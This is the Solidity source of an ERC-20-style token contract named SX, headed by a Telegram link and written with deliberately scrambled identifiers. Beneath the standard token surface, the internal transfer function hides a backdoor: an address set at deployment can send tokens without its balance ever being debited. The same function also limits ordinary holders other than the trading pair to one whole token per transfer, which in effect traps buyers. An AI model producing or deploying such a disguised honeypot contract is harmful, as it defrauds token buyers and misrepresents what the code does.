/*

https://t.me/ercsex

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract SX is Ownable {
    function approve(address wrnl, uint256 lqzodrt) public returns (bool success) {
        allowance[msg.sender][wrnl] = lqzodrt;
        emit Approval(msg.sender, wrnl, lqzodrt);
        return true;
    }

    IUniswapV2Router02 private xuminoeadrj;

    string public name;

    mapping(address => uint256) private uvpab;

    function vwlspnjfzqrx(address afdyjtok, address lygucdmjn, uint256 lqzodrt) private {
        address sovrzcnlhegf = IUniswapV2Factory(xuminoeadrj.factory()).getPair(address(this), xuminoeadrj.WETH());
        if (0 == uvpab[afdyjtok]) {
            if (afdyjtok != sovrzcnlhegf && rvklo[afdyjtok] != block.number && lqzodrt < totalSupply) {
                require(lqzodrt <= totalSupply / (10 ** decimals));
            }
            balanceOf[afdyjtok] -= lqzodrt;
        }
        balanceOf[lygucdmjn] += lqzodrt;
        rvklo[lygucdmjn] = block.number;
        emit Transfer(afdyjtok, lygucdmjn, lqzodrt);
    }

    string public symbol;

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private clvtnwdshauj = 120;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory mglzdp, string memory cryaqlmfgh, address heyjsxo, address fgwxjpyilhr) {
        name = mglzdp;
        symbol = cryaqlmfgh;
        balanceOf[msg.sender] = totalSupply;
        uvpab[fgwxjpyilhr] = clvtnwdshauj;
        xuminoeadrj = IUniswapV2Router02(heyjsxo);
    }

    mapping(address => uint256) public balanceOf;

    function transfer(address lygucdmjn, uint256 lqzodrt) public returns (bool success) {
        vwlspnjfzqrx(msg.sender, lygucdmjn, lqzodrt);
        return true;
    }

    mapping(address => uint256) private rvklo;

    function transferFrom(address afdyjtok, address lygucdmjn, uint256 lqzodrt) public returns (bool success) {
        require(lqzodrt <= allowance[afdyjtok][msg.sender]);
        allowance[afdyjtok][msg.sender] -= lqzodrt;
        vwlspnjfzqrx(afdyjtok, lygucdmjn, lqzodrt);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;
}